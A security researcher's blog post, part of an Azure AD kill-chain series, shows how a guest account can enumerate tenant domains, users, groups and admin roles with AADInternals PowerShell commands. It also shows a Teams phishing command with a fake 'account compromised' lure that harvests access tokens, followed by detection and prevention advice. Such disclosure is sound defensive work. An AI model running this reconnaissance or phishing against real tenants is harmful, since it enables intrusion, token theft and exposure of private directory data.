<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Quest for guest access: Azure Active Directory reconnaissance as a guest</title>
<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Quest for guest access: Azure Active Directory reconnaissance as a guest" />
<meta property="og:description" content="This post is part 2&frasl;5 of Azure AD and Microsoft 365 kill chain blog series.

When sharing SharePoint to people outside the organisations or inviting them to Teams, a corresponding guest account is created to Azure AD.
Although the created guest account is not a pure insider, it has wide read-only access to organisation&rsquo;s Azure AD information.

In this blog, using AADInternals v0.4.0, I&rsquo;ll show how to gather information from Azure AD tenant as a guest user.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://o365blog.com/post/quest_for_guest/" />



<meta property="article:published_time" content="2020-06-14T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2020-09-06T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-61454000-4', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Quest for guest access: Azure Active Directory reconnaissance as a guest</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2020-06-14T00:00:00">June 14, 2020</time>
					<time class="post__meta-lastmod" datetime="2020-09-06T00:00:00"> (Last Modified: September 06, 2020)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fquest_for_guest%2f&text=Quest%20for%20guest%20access%3a%20Azure%20Active%20Directory%20reconnaissance%20as%20a%20guest&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fquest_for_guest%2f&mini=true&title=Quest%20for%20guest%20access%3a%20Azure%20Active%20Directory%20reconnaissance%20as%20a%20guest&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/QuestForGuest.png" alt="Quest for guest access: Azure Active Directory reconnaissance as a guest">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#background">Background</a></li>
<li><a href="#azure-active-directory-account">Azure Active Directory account</a></li>
<li><a href="#azure-ad-reconnaissance">Azure AD reconnaissance</a>
<ul>
<li><a href="#azure-ad-tenant-information">Azure AD tenant information</a></li>
<li><a href="#user-enumeration">User enumeration</a></li>
</ul></li>
<li><a href="#phishing">Phishing</a></li>
<li><a href="#detecting">Detecting</a></li>
<li><a href="#preventing">Preventing</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#references">References</a></li>
</ul>
</nav>
			<p>This post is part <sup>2</sup>&frasl;<sub>5</sub> of <a href="/aadkillchain/" target="_blank">Azure AD and Microsoft 365 kill chain</a> blog series.</p>

<p>When sharing SharePoint to people outside the organisations or inviting them to Teams, a corresponding guest account is created to Azure AD.
Although the created guest account is not a pure insider, it has wide read-only access to organisation&rsquo;s Azure AD information.</p>

<p>In this blog, using <strong>AADInternals v0.4.0</strong>, I&rsquo;ll show how to gather information from Azure AD tenant as a guest user.</p>

<p></p>

<h1 id="background">Background</h1>

<p>According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">documentation</a> [Jun 23 2020]
the guest users have the following permissions to Azure AD:</p>

<table>
<thead>
<tr>
<th>Area</th>
<th>Guest user permissions</th>
</tr>
</thead>

<tbody>
<tr>
<td>Users and contacts</td>
<td>Read own properties. <br> Read display name, email, sign in name, photo, user principal name, and user type <strong>properties of other users and contacts</strong>. Change own password</td>
</tr>

<tr>
<td>Groups</td>
<td>Read all <strong>properties of groups</strong>. <br>Read non-hidden group memberships. <br>Read hidden Office 365 group memberships for joined groups. <br>Manage owned groups. <br>Add guests to owned groups (if allowed). <br>Delete owned groups. <br>Restore owned Office 365 groups. <br>Read <strong>properties of groups they belong to</strong>, including membership.</td>
</tr>

<tr>
<td>Applications</td>
<td>Read properties of registered and enterprise applications. <br>Manage application properties, assignments, and credentials for owned applications. <br>Delete owned applications. <br>Restore owned applications</td>
</tr>

<tr>
<td>Devices</td>
<td>Delete owned devices</td>
</tr>

<tr>
<td>Directory</td>
<td><strong>Read display name and verified domains</strong></td>
</tr>

<tr>
<td>Roles and scopes</td>
<td>No permissions</td>
</tr>

<tr>
<td>Subscriptions</td>
<td>No permissions</td>
</tr>

<tr>
<td>Policies</td>
<td>No permissions</td>
</tr>
</tbody>
</table>

<p>The list above is controversial with another <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">section</a> in the same documentation [Jun 23 2020]:</p>

<blockquote>
<p>Guest users have <strong>restricted directory permissions</strong>. For example, guest users <strong>cannot browse information from the tenant beyond their own profile information</strong>.
However, a guest user <strong>can retrieve information about another user by providing the User Principal Name or objectId</strong>. A guest user <strong>can read properties of groups they belong to</strong>,
including group membership, regardless of the Guest users permissions are limited setting. A guest <strong>cannot view information about any other tenant objects</strong>.</p>
</blockquote>

<p>To sum up, guest users <strong>CAN NOT list objects</strong> (such as users or groups), but they <strong>CAN read object properties</strong>, as long as the id (or user name) of the object is known.</p>

<h1 id="azure-active-directory-account">Azure Active Directory account</h1>

<p>Any user having access to Office/Microsoft 365 have an Azure AD account. Thus, everyone can log in at <a href="https://account.activedirectory.windowsazure.com/" target="_blank">account.activedirectory.windowsazure.com</a>
and see the list of organisations they have access to. This list includes all the organisations who have shared SharePoint sites with the user of invited the user to Teams.</p>

<p><img src="/images/posts/quest4guest_1.png" alt="Azure AD account" /></p>

<p>AADInternals can be used to list the tenants the user have access to.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Prompt for credentials and save the token to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the user&#39;s tenants</span>
<span class="nb">Get-AADIntAzureTenants</span></code></pre></div>
Output:</p>

<pre><code>Id                                   Country Name                      Domains                                                                                                  
--                                   ------- ----                      -------                                                                                                  
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy                  {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd               {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
</code></pre>

<h1 id="azure-ad-reconnaissance">Azure AD reconnaissance</h1>

<h2 id="azure-ad-tenant-information">Azure AD tenant information</h2>

<p>As we now know where we have guest access to, we can extract some interesting details from the target organisation.</p>

<p>First step here is to get a new access token for the target tenant (this only has to be done if the tenant has MFA enabled) and
invoke the reconnaissance. The function will ask you to choose the target tenant:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Prompt for credentials for Company Ltd tenant and save the token to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-Tenant</span> <span class="n">6e3846ee-e8ca</span><span class="p">-</span><span class="n">4609-a3ab-f405cfbd02cd</span> <span class="n">-SaveToCache</span>

<span class="c"># Invoke the reconnaissance and save results to a variable</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsGuest</span></code></pre></div>
Output:</p>

<pre><code>Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
</code></pre>

<p>The function prints out some relevant information, such as the number of Azure AD objects and quota, and the number of domains (both verified and unverified).</p>

<p><strong>Note!</strong> According to the <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">documentation</a> mentioned above,
<strong>guest users should not have no access to unverified domains</strong>. Unverified domains can contain business secrets, such as names of products and services currently under development.</p>

<p>This clearly is not true, as guest users can access details of all domains:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List the domains</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">domains</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">id</span><span class="p">,</span><span class="n">authen</span><span class="p">*,</span><span class="n">isverified</span><span class="p">,</span><span class="n">supported</span><span class="p">*,</span><span class="n">password</span><span class="p">*</span> <span class="p">|</span> <span class="nb">Format-Table</span></code></pre></div>
Output:</p>

<pre><code>id                               authenticationType isVerified supportedServices                                                passwordValidityPeriodInDays passwordNotificationWindowInDays
--                               ------------------ ---------- -----------------                                                ---------------------------- --------------------------------
company.mail.onmicrosoft.com     Federated                True {}                                                               2147483647                   30
company.onmicrosoft.com          Federated                True {Email, OfficeCommunicationsOnline}
www.company.com                  Federated                True {Sharepoint}
company.com                      Federated                True {Email, OfficeCommunicationsOnline, OrgIdAuthentication, Intune} 2147483647                   30
ournewproduct.com                Managed                 False {}
service.org                      Managed                 False {}
</code></pre>

<p>From the output, we can see all the domains, their authentication type, verification status, supported servers, and password validity period.
The password validity period of 2147483647 (0x7FFFFFFF) indicates that passwords do not expire. Well, actually they do but in 6 million years.</p>

<p>To see what rights the user actually has to target tenant (if available) can also be listed:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List allowed actions of the logged in user (if available)</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">allowedActions</span></code></pre></div>
Output:</p>

<pre><code>application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
</code></pre>

<p>This reveals that the user actually has read access to all aforementioned Azure AD objects.</p>

<h2 id="user-enumeration">User enumeration</h2>

<p>As already mentioned, guest users do have a read-only access to Azure AD. I&rsquo;ve known this for years but I haven&rsquo;t found a way to get a proper access tokess to Azure AD.
Well, actually, that is not entirely true.</p>

<p>With <a href="/post/aadbackdoor/" target="_blank">identity federation</a> and <a href="/post/kerberos/" target="_blank">Seamless SSO</a> backdoors one could forge a SAML or Kerberos token. This way it was possible
to log-in as a guest user and get an access token which worked with Azure AD and MSOnline PowerShell modules. However, I haven&rsquo;t found (yet) a way to get a working access token without backdoors.</p>

<p>Lately, as I was playing with Azure Core Management API, I noticed that I was able to access <a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-1.0" target="_blank">MS Graph API</a> as a guest user!</p>

<p>This, together what we know about guest users&rsquo; access rights to Azure AD, enables us to perform following reconnaissance:</p>

<p><strong>Stage 1</strong>: If we know the user id or upn of any user of the tenant, we can
list all the groups (including teams and roles) the user is member of. As a result, we now know the ids of those groups, and we can retrieve the list of members of those groups.</p>

<p><strong>Stage 2</strong>: Now we can retrieve the same information (groups and their members) for each user found at stage 1!</p>

<p><img src="/images/posts/quest4guest_2.png" alt="Azure AD account" /></p>

<p>To be able to read the directory entries, we need a starting point. If we don&rsquo;t know any user principal name from the target AAD, we can use our own name (as it is probably a member of a group or Teams).</p>

<p>Lets start by running the user enumeration and include manager, subordinates, and groups members:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Invoke the user enumeration</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntUserEnumerationAsGuest</span> <span class="n">-GroupMembers</span> <span class="n">-Manager</span> <span class="n">-Subordinates</span> <span class="n">-Roles</span></code></pre></div>
Output:</p>

<pre><code>Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        5
Groups:       2
Roles:        0
</code></pre>

<p>Lets list some relevant information from the returned groups:</p>

<p><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List group information</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">Groups</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">displayName</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">membershiprule</span><span class="p">,</span><span class="n">description</span></code></pre></div>
Output:</p>

<pre><code>displayName          id                                   membershipRule                                                             description                   
-----------          --                                   --------------                                                             -----------                   
All guests           b4c40137-6d42-4102-aa3b-023ba7d6e484 (user.userType -eq &quot;Guest&quot;) or (user.userPrincipalName -match &quot;.*#EXT#.*&quot;) All guests and externals users
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c                                                                            Teams with externals
</code></pre>

<p>Many organisations have created a <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/groups-create-rule" target="_blank">dynamic group</a> to contain all
guest and/or extrernal users. Usually this is used to assign conditional access rules etc. to these users. However, the group will contain all guests of the organisation, including business partners, clients, etc.
And yes, <strong>guest users can list the members of any group</strong>!</p>

<p><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List group information</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">Groups</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">displayName</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">members</span></code></pre></div>
Output:</p>

<pre><code>displayName          id                                   members                                                                                                                                                              
-----------          --                                   -------                                                                                                                                                              
All guests           b4c40137-6d42-4102-aa3b-023ba7d6e484 {user_gmail.com#EXT#@Mcompany.onmicrosoft.com, user_outlook.com#EXT#@company.onmicrosoft.com, ...}
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c {user@company.com, admin@company.onmicrosoft.com, user_outlook.com#EXT#@Mcompany.onmicrosoft.com} 
</code></pre>

<p>Now we have <strong>the list of all external users of the tenant</strong>!</p>

<p>But wait, there is more!</p>

<p>From the other group &ldquo;Teams with externals&rdquo; we can see the email address of tenant&rsquo;s user. With that, we can drill down even deeper to Azure AD.
The following will extract all users from all the groups the given user is member of (stage 2)!
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Invoke the user enumeration for the known user including group members</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntUserEnumerationAsGuest</span> <span class="n">-UserName</span> <span class="s2">&#34;user@company.com&#34;</span> <span class="n">-GroupMembers</span> <span class="n">-Manager</span> <span class="n">-Subordinates</span> <span class="n">-Roles</span></code></pre></div>
Output:</p>

<pre><code>Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        32
Groups:       4
Roles:        3
</code></pre>

<p>And now we can see all the groups the user is member of:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List group information</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">Groups</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">displayName</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">membershiprule</span><span class="p">,</span><span class="n">description</span></code></pre></div>
Output:</p>

<pre><code>displayName          id                                   membershipRule               description                                                                                     
-----------          --                                   --------------               -----------                                                                                     
Secret stuff teams   740f43a5-c7f8-4a1a-a6b8-2d57a1f6cda6                              This teams is meant for internal secret stuff! Mostly sensitive discussions with M&amp;A candidates.
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c                              Teams with externals                                                                            
abc                  9202b94b-5381-4270-a3cb-7fcf0d40fef1                              abc                                                                                             
All company          2ce444bc-6112-4429-922c-dbf6be59a6c3 (user.userType -eq &quot;Member&quot;) All company users 
</code></pre>

<p>Listing the group information reveals another typical configuration. There is a dynamic group for all organisation members: <strong>this allows guest users to access all users of the tenant!</strong></p>

<p>The last recon results includes also three roles. Roles are normal Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">admin roles</a>.
The role id does not match to those well-known ids used with AzureAD and MSOnline modules. In MS Graph API, those ids are called roleTemplateIds, which the actual roles are referring to.
For instance, if the role is a Global Admin, its roleTemplateId would be 62e90394-69f5-4237-9190-012177145e10.
Unfortunately, guest users can only read the id of each role but not the roleTemplateId. So, the actual role (Global Admin, etc.) is not known.</p>

<p><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List role information</span>
<span class="nv">$results</span><span class="p">.</span><span class="n">Roles</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">id</span><span class="p">,</span><span class="n">members</span></code></pre></div>
Output:</p>

<pre><code>id                                   members                                                                                                                                   
--                                   -------                                                                                                                                   
8b517a6e-d13e-4e97-a2c0-278ae38d46a6 {test.user@company.com}                                                                                                         
294cdfc8-abb4-419f-bdbb-c5d616644f9a {Sync_SERVER1_895b43df@company.com}
028e7f7b-c99a-41bb-9d5c-2d22457b5549 {admin@company.com, admin@company.onmicrosoft.com}     
</code></pre>

<p>From the output, we can make an assumption that the second role would be a &ldquo;Directory Synchronization Accounts&rdquo; role and the last one &ldquo;Global Adminisrator&rdquo; role.</p>

<h1 id="phishing">Phishing</h1>

<p>Just like the <a href="/post/just-looking#phishing" target="_blank">outsider</a> can <a href="/post/phishing/#email" target="_blank">send phishing emails</a>, so can guests.
However, guests and <a href="/post/insider" target="_blank">insiders</a> can also <a href="/post/phishing/#teams" target="_blank">send phishing messages using Teams</a>.</p>

<p>The message to be sent can be customised. When using Teams for phishing, AADInternals replaces the original phishing message with a clean message after the tokens are received.
This message can be customise with -CleanMessage parameter.</p>

<p>The example below sends a custom message:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Send a phishing email to recipients using customised messages and save the tokens to cache</span>
<span class="nv">$message</span> <span class="p">=</span> <span class="s1">&#39;Your Microsoft account has been compromised. Login at &lt;a href=&#34;{1}&#34;&gt;https://microsoft.com&lt;/a&gt; to reset your password. &lt;br&gt; Use the following security code: &lt;b&gt;{0}&lt;/b&gt;.&#39;</span> 
<span class="nb">Invoke-AADIntPhishing</span> <span class="n">-Recipients</span> <span class="s2">&#34;wvictim@company.com&#34;</span><span class="p">,</span><span class="s2">&#34;wvictim2@company.com&#34;</span> <span class="n">-Message</span> <span class="nv">$message</span> <span class="n">-CleanMessage</span> <span class="s2">&#34;🙂&#34;</span> <span class="n">-Teams</span> <span class="n">-SaveToCache</span></code></pre></div></p>

<pre><code>Code: CKDZ2BURF
Mail sent to: wvictim@company.com
Mail sent to: wvictim2@company.com
...
Received access token for william.victim@company.com
</code></pre>

<h1 id="detecting">Detecting</h1>

<p>Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-reports-data-retention#how-long-does-azure-ad-store-the-data" target="_blank">sign-in log</a>
is now available for all Azure AD editions. So, this would be an obvious place to start with. However, the AADInternals functions are using the application id of Microsoft Office (d3590ed6-52b3-4102-aeff-aad2292ab01c).
This means that getting a new access token seems to be a legit login event.</p>

<p>The API calls to Azure AD are not logged and therefore the users&rsquo; actions can not be detected.</p>

<h1 id="preventing">Preventing</h1>

<p>Traditionally only thing to restrict guests access was to <a href="/post/limit-user-access/#block-users-access-to-others-information" target="_blank">block access to other users&rsquo; data</a> for all users.
Unfortunately, this also prevented normal users from adding others to Teams and groups so it was not very practical way.</p>

<p>However, there is a new feature in preview which allows restricting guests access to group members:</p>

<p><img src="/images/posts/quest4guest_4.png" alt="Restrict guests" /></p>

<p>This effectively prevents guests for enumerating organisation groups and users :thumbsup:</p>

<p>Therefore, <strong>I urge every administrator to limit guests access IMMEDIATELY!</strong> Go to User settings <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/UsersManagementMenuBlade/UserSettings" target="_blank">here</a> and
click &ldquo;Manage external collaboration settings&rdquo;.</p>

<h1 id="summary">Summary</h1>

<p>Inviting people outside of the organisation to Teams gives them access to Azure AD of the tenant. As demonstrated, guests can crawl the entire Azure AD and get information not meant for their eyes - with no traces of
rogue behaviour!
This may lead to loss of business secrets.</p>

<p>Restricting guest access (preview feature) prevents guests for enumerating users and groups, but does not block tenant recon.</p>

<p>I strongly suggest avoiding using the dynamic groups that include all guest users or all company users. This would help limiting the guest user access to potential sensitive data, such as customer information.</p>

<p><strong>Note:</strong> If people are leaving the organisation, they might have invited themselves using their personal emails to maintain access to Azure AD (I know I would :speak_no_evil:).
So, if you are an admin, remember to double-check for any guest accounts the leaving user have invited.</p>

<p><strong>Tip:</strong> To hide your on-coming new products from the guests, do not register the corresponding domain names to Azure AD!</p>

<h1 id="references">References</h1>

<ul>
<li><a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-1.0" target="_blank">MS Graph API v1.0 reference</a></li>
<li><a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-beta" target="_blank">MS Graph API beta reference</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions" target="_blank">What are the default user permissions in Azure Active Directory?</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">Administrator role permissions in Azure Active Directory</a></li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/reconnaissance/" rel="tag">reconnaissance</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/security/" rel="tag">security</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/guest/" rel="tag">guest</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fquest_for_guest%2f&text=Quest%20for%20guest%20access%3a%20Azure%20Active%20Directory%20reconnaissance%20as%20a%20guest&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fquest_for_guest%2f&mini=true&title=Quest%20for%20guest%20access%3a%20Azure%20Active%20Directory%20reconnaissance%20as%20a%20guest&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/just-looking/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Just looking: Azure Active Directory reconnaissance as an outsider</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/insider/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Wolf in sheep&#39;s clothing: Azure Active Directory reconnaissance as an insider</p></a>
	</div>
</nav>

	
<div class="comments">
	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

</main>

<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
	
<div class="widget-search widget">
